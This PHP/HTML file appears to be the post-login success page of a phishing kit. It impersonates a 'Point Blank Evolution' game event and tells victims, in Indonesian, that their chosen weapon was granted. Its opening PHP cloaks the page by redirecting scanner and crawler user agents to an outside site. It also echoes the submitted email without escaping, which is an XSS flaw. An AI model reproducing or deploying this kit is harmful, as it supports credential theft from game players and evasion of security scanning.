<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}

$email = $_POST['email'];

if(empty($email)) {
    header('location: ./');
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Point Blank Evolution">
    <meta name="description" content="Ikuti Eventnya Sekarang">
    <meta property="og:description" content="Ikuti Eventnya Sekarang">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="PB Evolution">
    <meta property="og:image" content="./assets/images/7.jpg">
    <meta property="og:type" content="website">
    <meta name="author" content="Idhaam69, rajaarn0@gmail.com">
    <meta name="copyright"content="Point Blank Evolution">
    <title>PB Evolution | Events</title>
    <link rel="stylesheet" type="text/css" media="screen" href="./assets/css/style.css" />
    <link rel="shorcut icon" href="./assets/images/favicon.ico">
</head>
<body>
    <div id="landingpage">
        <img class="img-landingpage" src="./assets/images/logo.png" alt="idhaam69"/>
        <p class="txt-landingpage">SELAMAT <?php echo $email;?></p>
        <hr class="garis-landingpage">
        <p class="txt-landingpage">SENJATA YANG ANDA PILIH BERHASIL DIDAPATKAN.</p>
        <button class="btn-landingpage" onclick="location.href='./logout.php';">LOGOUT</button>
        <button class="btn-landingpage" onclick="location.href='';">SHARE</button>
    </div>
</body>
<script src="./assets/js/idhaam69.js"></script>
</html>
